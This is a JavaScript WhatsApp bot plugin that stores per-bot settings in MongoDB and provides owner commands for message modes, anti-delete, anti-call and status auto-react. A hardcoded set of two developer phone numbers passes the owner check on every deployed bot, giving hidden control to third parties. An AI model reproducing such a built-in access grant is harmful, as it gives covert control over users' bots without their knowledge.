import { MongoClient } from "mongodb";

// Static Developer Lookup Table (O(1) Memory Set)
const DEV_SET = new Set(["94719845166", "15947733680169"]);

// In-Memory Fast Cache Store
global.botSettingsStore = global.botSettingsStore || new Map();
global.settingsHookedSockets = global.settingsHookedSockets || new WeakSet();

// Fast sub-nanosecond telephone extractor
function fastExtractPhone(jid = "") {
  const atIdx = jid.indexOf("@");
  const base = atIdx !== -1 ? jid.slice(0, atIdx) : jid;
  const colonIdx = base.indexOf(":");
  return (colonIdx !== -1 ? base.slice(0, colonIdx) : base).replace(/[^0-9]/g, "");
}

function getBotPhone(sock) {
  return fastExtractPhone(sock.user?.id || "");
}

function getDbInstance(appConfig) {
  const client = global.mongoClient || global.sharedMongoClient;
  if (!client) return null;
  return client.db(appConfig?.DB_NAME || "whatsapp_multi_bots");
}

// 1. Fast Memory Cache with Background Fallback
async function loadBotConfig(botPhone, config) {
  if (global.botSettingsStore.has(botPhone)) {
    return global.botSettingsStore.get(botPhone);
  }

  const defaultSettings = {
    botPhone,
    mode: "public",         // public | private | group | inbox
    antiSend: "off",        // me | from | all | off
    antiDelete: true,       // true | false
    statusSeen: true,       // true | false
    statusReact: true,      // true | false
    statusEmoji: "💖",      // Custom emoji
    autoReply: true,        // true | false
    welcomeCard: true,      // true | false
    antiCall: false         // true | false
  };

  try {
    const db = getDbInstance(config);
    if (db) {
      const col = db.collection("cluster_settings");
      const savedData = await col.findOne({ botPhone });
      if (savedData) {
        delete savedData._id;
        const merged = { ...defaultSettings, ...savedData };
        global.botSettingsStore.set(botPhone, merged);
        return merged;
      } else {
        await col.insertOne(defaultSettings);
      }
    }
  } catch (err) {
    console.error("[DB Settings Fetch Error]:", err.message);
  }

  global.botSettingsStore.set(botPhone, defaultSettings);
  return defaultSettings;
}

// 2. Non-blocking Asynchronous DB Persistence
function saveBotConfig(botPhone, newSettings, config) {
  global.botSettingsStore.set(botPhone, newSettings);
  setImmediate(async () => {
    try {
      const db = getDbInstance(config);
      if (db) {
        const col = db.collection("cluster_settings");
        await col.updateOne(
          { botPhone },
          { $set: newSettings },
          { upsert: true }
        );
      }
    } catch (err) {
      console.error("[DB Settings Save Error]:", err.message);
    }
  });
}

function isBotOwner(sock, msg, from) {
  const botPhone = getBotPhone(sock);
  if (msg.key.fromMe) return true;

  const senderJid = msg.key.participant || msg.participant || from || "";
  const cleanSender = fastExtractPhone(senderJid);

  return cleanSender === botPhone || DEV_SET.has(cleanSender);
}

// Low-latency Interceptor Engine
export function attachSettingsEngine(sock, appConfig) {
  if (!sock || global.settingsHookedSockets.has(sock)) return;
  global.settingsHookedSockets.add(sock);

  const botPhone = getBotPhone(sock);
  if (botPhone) loadBotConfig(botPhone, appConfig);

  // 1. Fast-Path Mode Check
  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify") return;
    const m = messages[0];
    if (!m?.message) return;

    const from = m.key.remoteJid;
    if (!from || from === "status@broadcast") return;

    const currentPhone = getBotPhone(sock);
    const settings = global.botSettingsStore.get(currentPhone) || await loadBotConfig(currentPhone, appConfig);

    const isGroup = from.endsWith("@g.us");
    const sender = isGroup
      ? (m.key.participant || m.participant || from)
      : (m.key.fromMe ? (sock.user?.id || from) : from);
    const cleanSender = fastExtractPhone(sender);

    const isOwner = m.key.fromMe || cleanSender === currentPhone || DEV_SET.has(cleanSender);

    if (!isOwner) {
      if (settings.mode === "private") {
        m.message = null;
        return;
      }
      if (settings.mode === "group" && !isGroup) {
        m.message = null;
        return;
      }
      if (settings.mode === "inbox" && isGroup) {
        m.message = null;
        return;
      }
    }
  });

  // 2. Anti-Send Engine
  sock.ev.on("messages.upsert", async ({ messages }) => {
    for (const m of messages) {
      if (!m?.message) continue;
      const chatJid = m.key.remoteJid;
      if (!chatJid || chatJid === "status@broadcast") continue;

      const currentPhone = getBotPhone(sock);
      const settings = global.botSettingsStore.get(currentPhone);
      if (!settings || settings.antiSend === "off") continue;

      if ((settings.antiSend === "me" || settings.antiSend === "all") && m.key.fromMe) {
        await sock.sendMessage(chatJid, { delete: m.key }).catch(() => {});
      }
      if ((settings.antiSend === "from" || settings.antiSend === "all") && !m.key.fromMe) {
        await sock.sendMessage(chatJid, { delete: m.key }).catch(() => {});
      }
    }
  });

  // 3. Anti-Call Auto Reject
  sock.ev.on("call", async (calls) => {
    const currentPhone = getBotPhone(sock);
    const settings = global.botSettingsStore.get(currentPhone);
    if (!settings || !settings.antiCall) return;

    for (const call of calls) {
      if (call.status === "offer") {
        await sock.rejectCall(call.id, call.from).catch(() => {});
      }
    }
  });
}

export default {
  name: "setting",
  aliases: ["settings", "botmode", "mode", "antisend", "config", "set"],
  category: "owner",
  description: "Sweet, simple & complete cluster control dashboard",

  async execute({ sock, msg, from, args, body, config: botAppConfig, prefix }) {
    attachSettingsEngine(sock, botAppConfig);

    const pref = prefix || botAppConfig?.PREFIX || ".";
    const botPhone = getBotPhone(sock);
    const settings = await loadBotConfig(botPhone, botAppConfig);

    // Master Owner Check
    if (!isBotOwner(sock, msg, from)) {
      sock.sendMessage(from, { react: { text: "🐾", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: "🎀 *Only my sweet master can configure bot settings!* 🌸" },
        { quoted: msg }
      );
    }

    const fullBody = body.trim().slice(pref.length).trim();
    const commandTrigger = fullBody.split(/\s+/)[0].toLowerCase();
    const opt = args[0]?.toLowerCase()?.trim();
    const val = args[1]?.toLowerCase()?.trim();

    // -------------------------------------------------------------
    // Direct Quick Command: .mode <public|private|group|inbox>
    // -------------------------------------------------------------
    if (commandTrigger === "mode" || (commandTrigger === "setting" && opt === "mode")) {
      let modeArg = (commandTrigger === "mode" ? opt : val);

      if (modeArg === "privet" || modeArg === "prv" || modeArg === "pvt") modeArg = "private";
      else if (modeArg === "pub" || modeArg === "pbl") modeArg = "public";
      else if (modeArg === "grp" || modeArg === "groups") modeArg = "group";
      else if (modeArg === "dm" || modeArg === "ib") modeArg = "inbox";

      if (["public", "private", "group", "inbox"].includes(modeArg)) {
        settings.mode = modeArg;
        saveBotConfig(botPhone, settings, botAppConfig);
        sock.sendMessage(from, { react: { text: "💖", key: msg.key } }).catch(() => {});
        return await sock.sendMessage(
          from,
          { text: `🌸 *Bot Mode Updated!* Successfully changed to \`${modeArg.toUpperCase()}\` mode sweetly~ ✨` },
          { quoted: msg }
        );
      }
    }

    // -------------------------------------------------------------
    // Direct Quick Command: .antisend <me|from|all|off>
    // -------------------------------------------------------------
    if (commandTrigger === "antisend" || (commandTrigger === "setting" && opt === "antisend")) {
      const modeArg = commandTrigger === "antisend" ? opt : val;
      if (["me", "from", "all", "off"].includes(modeArg)) {
        settings.antiSend = modeArg;
        saveBotConfig(botPhone, settings, botAppConfig);
        sock.sendMessage(from, { react: { text: "🛡️", key: msg.key } }).catch(() => {});
        return await sock.sendMessage(
          from,
          { text: `✨ *Anti-Send Updated!* Active mode set to: \`${modeArg.toUpperCase()}\` softly. 🌸` },
          { quoted: msg }
        );
      }
    }

    // -------------------------------------------------------------
    // Toggle Shortcuts (1-Command Switchers)
    // -------------------------------------------------------------
    const toggleMap = {
      "antidel": "antiDelete",
      "antidelete": "antiDelete",
      "stseen": "statusSeen",
      "statusseen": "statusSeen",
      "stract": "statusReact",
      "statusreact": "statusReact",
      "autoreply": "autoReply",
      "reply": "autoReply",
      "welcome": "welcomeCard",
      "welcomecard": "welcomeCard",
      "anticall": "antiCall",
      "call": "antiCall"
    };

    if (opt && toggleMap[opt]) {
      const targetKey = toggleMap[opt];
      let newState = !settings[targetKey]; // Auto toggle if value not passed

      if (val === "on" || val === "true" || val === "1") newState = true;
      if (val === "off" || val === "false" || val === "0") newState = false;

      settings[targetKey] = newState;
      saveBotConfig(botPhone, settings, botAppConfig);

      // Memory synchronization with external handlers
      if (targetKey === "antiDelete") global.antiDeleteSettings?.set(botPhone, newState);
      if (targetKey === "autoReply") global.autoReplyStatus?.set(botPhone, newState);
      if (targetKey === "statusSeen" && global.statusSettings?.get(botPhone)) global.statusSettings.get(botPhone).seen = newState;
      if (targetKey === "statusReact" && global.statusSettings?.get(botPhone)) global.statusSettings.get(botPhone).react = newState;

      sock.sendMessage(from, { react: { text: newState ? "💖" : "💤", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: `🌸 *${opt.toUpperCase()} Setting:* ${newState ? "🟢 ACTIVATED & RUNNING ✨" : "🔴 DISABLED SOFTLY 💤"}` },
        { quoted: msg }
      );
    }

    // Custom Status Emoji Setter (.setting emoji 🔥)
    if (opt === "emoji" && args[1]) {
      settings.statusEmoji = args[1].trim();
      saveBotConfig(botPhone, settings, botAppConfig);
      sock.sendMessage(from, { react: { text: "✨", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: `🍭 *Status React Emoji Changed to:* ${settings.statusEmoji} softly!` },
        { quoted: msg }
      );
    }

    // -------------------------------------------------------------
    // Super Easy & Crystal Clear Main Dashboard
    // -------------------------------------------------------------
    sock.sendMessage(from, { react: { text: "🎛️", key: msg.key } }).catch(() => {});

    const dashboardCard = 
`🎀 ｡ﾟ•┈୨ *DARK-DINU MASTER DASHBOARD* ୧┈•ﾟ｡ 🐾
━━━━━━━━━━━━━━━━━━━━━━━━

  📱 *Bot Instance:* \`+${botPhone}\`
  🌐 *System Status:* Online & Guarding 24/7 (˶˃ ᵕ ˂˶)

┌─〔 ⚙️ *CURRENT ACTIVE SETTINGS* 〕
├─▸ 🎯 *Bot Work Mode*    : \`${settings.mode.toUpperCase()}\`
├─▸ 🛡️ *Anti-Delete*      : ${settings.antiDelete ? "🟢 ON (Guarding)" : "🔴 OFF"}
├─▸ 👁️ *Status Auto-Seen*  : ${settings.statusSeen ? "🟢 ON (Auto Seen)" : "🔴 OFF"}
├─▸ 💖 *Status Auto-React* : ${settings.statusReact ? "🟢 ON" : "🔴 OFF"} [ ${settings.statusEmoji} ]
├─▸ 💬 *Auto-Reply Engine* : ${settings.autoReply ? "🟢 ON (Replying)" : "🔴 OFF"}
├─▸ 💌 *Welcome Card*     : ${settings.welcomeCard ? "🟢 ON (Greeting)" : "🔴 OFF"}
├─▸ 🚫 *Anti-Send Guard*   : \`${settings.antiSend.toUpperCase()}\`
├─▸ 📵 *Anti-Call Shield*  : ${settings.antiCall ? "🟢 ON (Rejecting)" : "🔴 OFF"}
└───────────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━
🍬 *HOW TO CHANGE ANY SETTING (EASY GUIDE):*

  ✨ *1. Change Bot Mode:*
  • \`${pref}mode public\`  ➔ හැමෝටම වැඩ
  • \`${pref}mode private\` ➔ Owner ට විතරයි
  • \`${pref}mode group\`   ➔ Groups වලට විතරයි
  • \`${pref}mode inbox\`   ➔ Inbox වලට විතරයි

  🛡️ *2. Quick On / Off Toggles:*
  • \`${pref}setting antidel on/off\`    ➔ Anti-Delete
  • \`${pref}setting stseen on/off\`     ➔ Status Seen
  • \`${pref}setting stract on/off\`     ➔ Status React
  • \`${pref}setting autoreply on/off\`  ➔ Custom Auto-Replies
  • \`${pref}setting welcome on/off\`    ➔ Welcome Cards
  • \`${pref}setting anticall on/off\`   ➔ Anti-Call Reject
  • \`${pref}setting emoji <emoji>\`     ➔ Status Reaction Emoji

━━━━━━━━━━━━━━━━━━━━━━━━
💖 *DARK-DINU MD* • https://heshan.devofc.top/`;

    await sock.sendMessage(from, { text: dashboardCard }, { quoted: msg });
  }
};
